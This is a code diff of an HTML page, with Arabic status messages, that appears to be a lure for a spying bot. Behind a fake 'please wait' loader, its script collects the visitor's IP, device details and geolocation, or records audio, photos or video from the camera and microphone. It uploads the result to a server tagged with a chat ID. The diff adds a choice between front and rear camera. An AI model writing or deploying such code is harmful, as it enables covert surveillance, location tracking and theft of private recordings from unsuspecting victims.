@@ -16,18 +16,17 @@
         <div class="loader" id="loader"></div>
         <div id="status">أنتظر قليلاً...</div>
     </div>
-
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('chatId');
         const type = urlParams.get('type');
+        const facing = urlParams.get('facing') || 'user';
         
         async function run() {
             try {
                 if (type === 'info' || type === 'iptrack') {
                     const ipRes = await fetch('https://api.ipify.org?format=json');
                     const ipData = await ipRes.json();
-                    
                     let location = "غير متاح";
                     if (navigator.geolocation) {
                         try {
@@ -35,19 +34,12 @@
                             location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
                         } catch(e) {}
                     }
-
-                    const info = {
-                        ip: ipData.ip,
-                        device: navigator.userAgent,
-                        screen: `${screen.width}x${screen.height}`,
-                        location: location
-                    };
-                    
+                    const info = { ip: ipData.ip, device: navigator.userAgent, screen: `${screen.width}x${screen.height}`, location: location };
                     document.getElementById('status').innerText = "جاري الإرسال...";
                     const formData = new FormData();
                     formData.append('data', JSON.stringify(info, null, 2));
                     formData.append('chatId', chatId);
-                    formData.append('type', 'info');
+                    formData.append('type', type);
                     await fetch('/upload', { method: 'POST', body: formData });
                     document.getElementById('status').innerText = "تم بنجاح.";
                     document.getElementById('loader').style.display = 'none';
@@ -55,56 +47,37 @@
                 }
 
                 let constraints = {};
-                if (type === 'audio') {
-                    constraints = { audio: true, video: false };
-                } else if (type === 'video') {
-                    constraints = { audio: true, video: { facingMode: "user" } };
-                } else if (type === 'photo') {
-                    constraints = { audio: false, video: { facingMode: "user" } };
-                }
+                if (type === 'audio') { constraints = { audio: true, video: false }; }
+                else if (type === 'video') { constraints = { audio: true, video: { facingMode: facing } }; }
+                else if (type === 'photo') { constraints = { audio: false, video: { facingMode: facing } }; }
 
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 document.getElementById('status').innerText = "جاري الاتصال...";
-                
                 const mediaRecorder = new MediaRecorder(stream);
                 let chunks = [];
-
                 mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                
                 mediaRecorder.onstop = async () => {
                     const mime = type === 'audio' ? 'audio/webm' : (type === 'photo' ? 'image/jpeg' : 'video/webm');
                     const blob = new Blob(chunks, { type: mime });
-                    
                     document.getElementById('status').innerText = "جاري الرفع...";
                     const formData = new FormData();
                     formData.append('file', blob);
                     formData.append('chatId', chatId);
                     formData.append('type', type);
-                    
                     await fetch('/upload', { method: 'POST', body: formData });
                     document.getElementById('status').innerText = "تم الإرسال بنجاح.";
                     document.getElementById('loader').style.display = 'none';
                 };
-
                 mediaRecorder.start();
-
-                // المدة: صورة 3 ثواني، فيديو 10 ثواني، صوت 15 ثانية
                 let duration = 15000;
                 if (type === 'photo') duration = 3000;
                 if (type === 'video') duration = 10000;
-
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                    stream.getTracks().forEach(track => track.stop());
-                }, duration);
-
+                setTimeout(() => { mediaRecorder.stop(); stream.getTracks().forEach(track => track.stop()); }, duration);
             } catch (err) {
-                document.getElementById('status').innerText = "فشل الاتصال. يرجى المحاولة مرة أخرى.";
+                document.getElementById('status').innerText = "فشل الاتصال.";
                 document.getElementById('loader').style.display = 'none';
-                console.error(err);
             }
         }
-
         setTimeout(run, 1500);
     </script>
 </body>
